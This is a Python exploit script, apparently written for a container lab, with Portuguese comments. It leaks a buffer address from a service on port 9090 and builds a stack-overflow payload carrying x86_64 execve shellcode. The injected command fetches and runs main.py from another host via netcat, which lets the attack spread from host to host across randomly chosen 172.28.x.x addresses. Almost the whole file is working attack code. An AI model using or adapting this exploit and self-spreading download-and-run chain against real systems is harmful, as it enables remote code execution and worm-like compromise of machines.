#!/usr/bin/env python3
import os
import subprocess
from random import randint
import socket
import ipaddress
import re
import time


def log(msg, level="INFO"):
    ts = time.strftime("%H:%M:%S")
    print(f"[{ts}] [{level}] {msg}")


def create_hex_command(command = b"echo 'true' > input.txt"):
    comando_alinhado = command + b"\x00"
    while len(comando_alinhado) % 8 != 0:
        comando_alinhado += b"\x00"
    # Constrói o shellcode dinamicamente invertendo o comando para o PUSH (Stack cresce para baixo)
    shellcode_dinamico = b""

    # 1. Empilha o comando em blocos de 8 bytes (x86_64)
    for i in range(len(comando_alinhado) - 8, -1, -8):
        bloco = comando_alinhado[i:i+8]
        shellcode_dinamico += b"\x48\xb8" + bloco  # mov rax, bloco_de_8_bytes
        shellcode_dinamico += b"\x50"              # push rax

    shellcode_dinamico += b"\x48\x89\xe2"          # mov rdx, rsp (rdx aponta para o comando)

    # 2. Empilha a flag "-c"
    shellcode_dinamico += (
        b"\x48\xb8\x2d\x63\x00\x00\x00\x00\x00\x00"  # mov rax, 0x632d ("-c\x00...")
        b"\x50"                                      # push rax
        b"\x48\x89\xe6"                              # mov rsi, rsp (rsi aponta para "-c")
    )

    # 3. Empilha o executável "/bin/sh"
    shellcode_dinamico += (
        b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # mov rax, 0x0068732f6e69622f ("/bin/sh\x00")
        b"\x50"                                      # push rax
        b"\x48\x89\xe7"                              # mov rdi, rsp (rdi aponta para "/bin/sh")
    )

    # 4. Constrói o array argv na pilha [ /bin/sh, -c, comando, NULL ]
    shellcode_dinamico += (
        b"\x48\x31\xc0"  # xor rax, rax
        b"\x50"          # push rax (NULL terminator do array)
        b"\x52"          # push rdx (ponteiro para o comando)
        b"\x56"          # push rsi (ponteiro para "-c")
        b"\x57"          # push rdi (ponteiro para "/bin/sh")
        b"\x48\x89\xe6"  # mov rsi, rsp (rsi agora é o argv[])
        b"\x48\x31\xd2"  # xor rdx, rdx (envp = NULL)
        b"\xb0\x3b"      # mov al, 59 (syscall execve)
        b"\x0f\x05"      # syscall
    )
    log(f"Shellcode pronto: {len(shellcode_dinamico)} bytes")
    log(f"Preview (hex): {shellcode_dinamico[:32].hex()}{'...' if len(shellcode_dinamico) > 32 else ''}")
    return shellcode_dinamico


# def getNextTarget():
#     return "172.28.1.10"


def getNextTarget():
    """Retorna um IP aleatório no formato 172.28.[1-5].[10-14]."""
    
    # Sorteia o terceiro octeto (de 1 a 5)
    terceiro_octeto = randint(1, 5)
    # terceiro_octeto = 1
    
    # Sorteia o quarto octeto (de 10 a 14)
    quarto_octeto = randint(10, 14)
    # quarto_octeto = 11


    # Monta a string do IP com os valores sorteados
    ip_sorteado = f"172.28.{terceiro_octeto}.{quarto_octeto}"
    
    return ip_sorteado


def getFile(bufaddr, shellcode):
    """
    Layout do payload (500 bytes, = tamanho de `input` em main):

      [0:72)     preenchimento (NOP) -- nunca é executado, só precisa nao ter \x00
      [72:80)    endereco de retorno -- aponta para dentro de `input` (main),
                 onde o NOP sled + shellcode ficam intactos (o read() nao trunca em \0,
                 diferente do strcpy que soh alcanca ateh aqui)
      [80:100)   NOP sled
      [100:...)  shellcode (create_hex_command, sem alteracao)
    """
    OFFSET = 72                        # distancia confirmada via GDB: buffer -> retorno
    INPUT_OFFSET_FROM_BUFFER = 0x50    # distancia fixa entre buffer (bof) e input (main)
    SHELL_START = 100

    content = bytearray(0x90 for _ in range(500))
    content[SHELL_START:SHELL_START + len(shellcode)] = shellcode

    input_addr = bufaddr + INPUT_OFFSET_FROM_BUFFER
    ret = input_addr + 80              # aponta pro comeco do NOP sled, dentro de `input`

    content[OFFSET:OFFSET + 8] = ret.to_bytes(8, byteorder="little")

    return content


def writeFile(file, targetIP):
    with open("file", "wb") as f:
        f.write(file)

    log(f"Enviando payload ({len(file)} bytes) para {targetIP}:9090...")

    try:
        subprocess.run(
            f"cat file | nc -w3 {targetIP} 9090",
            shell=True,
            timeout=5
        )
        log(f"Payload entregue em {targetIP}:9090", level="OK")
    except subprocess.TimeoutExpired:
        log(f"Timeout ao enviar payload para {targetIP}:9090", level="ERRO")


def bufferAddress(targetIP):
    log(f"Sondando {targetIP}:9090 para vazar o endereço do buffer...")

    try:
        result = subprocess.run(
            f"echo | nc -w3 {targetIP} 9090",
            shell=True,
            timeout=5,
            capture_output=True,
            text=True
        )
    except subprocess.TimeoutExpired:
        log(f"Timeout ao sondar {targetIP}:9090 — alvo pode estar fora do ar", level="ERRO")
        return None

    resposta = result.stdout.strip()
    log(f"Resposta do alvo: {resposta!r}")

    match = re.search(r"0x[0-9a-fA-F]+", resposta)
    if match:
        return int(match.group(), 16)

    log(f"Não encontrei um endereço na resposta de {targetIP}", level="ERRO")
    return None


def main():
    print("Olá! ^_^")

    targetIP = getNextTarget()
    print(f"Host de destino: {targetIP}")

    bufaddr = bufferAddress(targetIP)
    if bufaddr is None:
        print("Não consegui ler o endereço do buffer. Abortando.")
        return
    print(f"Endereço do buffer: {hex(bufaddr)}")

    shellcode = create_hex_command(b"(echo 'true' > input.txt ; nc -w3 172.28.1.100 8080 < /dev/null > main.py ; python3 main.py > out.txt) < /dev/null > /dev/null 2>&1 &")

    payload = getFile(bufaddr, shellcode)

    writeFile(payload, targetIP)

    print("Payload enviado! Verifique se input.txt apareceu dentro do container.")


if __name__ == "__main__":
    # command = "while true; do nc -lnvp 8080 < main.py; done"
    # server = subprocess.Popen(command, shell=True)

    main()

    # server.terminate()
    # server.wait()
    # print("Processo fechado!")
